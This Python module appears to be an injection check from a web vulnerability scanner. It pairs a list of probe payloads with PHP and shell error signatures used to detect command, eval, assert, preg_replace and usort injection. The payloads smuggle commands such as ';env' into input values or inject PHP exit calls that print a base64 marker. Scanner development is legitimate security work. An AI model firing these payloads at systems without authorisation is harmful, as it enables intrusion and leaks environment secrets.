import re

class Check(object):
	def __init__(self):
		self.payload = self.gen_payload()
		self.sig = {
			"preg_replace Injection": [
				"Fatal error</b>: preg_replace", # TODO check this signature
				"Warning: preg_replace():" # TODO add more signature
			],
			"Eval code execution": [
				"eval()'d code</b> on line <b>",
				],
			"OS Command Injection": [
				"Cannot execute a blank command in",
				"sh: command substitution:",
			],
			"usort Injection": [
				"Warning: usort()",
			],
			"assert() Injection": [
				"Warning: assert():",
			],
		}

	def check(self, browser, payload):
		response = str(browser.get_current_page())
		for injection_types in self.sig.keys():
			for sig in self.sig[injection_types]:
				match = re.findall(re.escape(sig), response)
				if match:
					self.found(injection_types, browser.get_url())
					return True

	def gen_payload(self):
		return [
			";env",
			"a;env",
			"a);env",
			"[VALUE];env",
			"[VALUE][LF]env",
			"/e\0",
			"a;exit(base64_decode('dzRwMXQxX2V2YWw='));//",
			"a;exit(base64_decode('dzRwMXQxX2V2YWw='));#",
			"\";exit(base64_decode('dzRwMXQxX2V2YWw='));//",
			"\";exit(base64_decode('dzRwMXQxX2V2YWw='));#",
			"';exit(base64_decode('dzRwMXQxX2V2YWw='));//",
			"';exit(base64_decode('dzRwMXQxX2V2YWw='));#",
			"\".exit(base64_decode('dzRwMXQxX2V2YWw='));//",
			"\".exit(base64_decode('dzRwMXQxX2V2YWw='));#",
			"'.exit(base64_decode('dzRwMXQxX2V2YWw='));//",
			"'.exit(base64_decode('dzRwMXQxX2V2YWw='));#",
		]

	def found(self, inject_type, url):
		events.vuln_crit(inject_type, url)
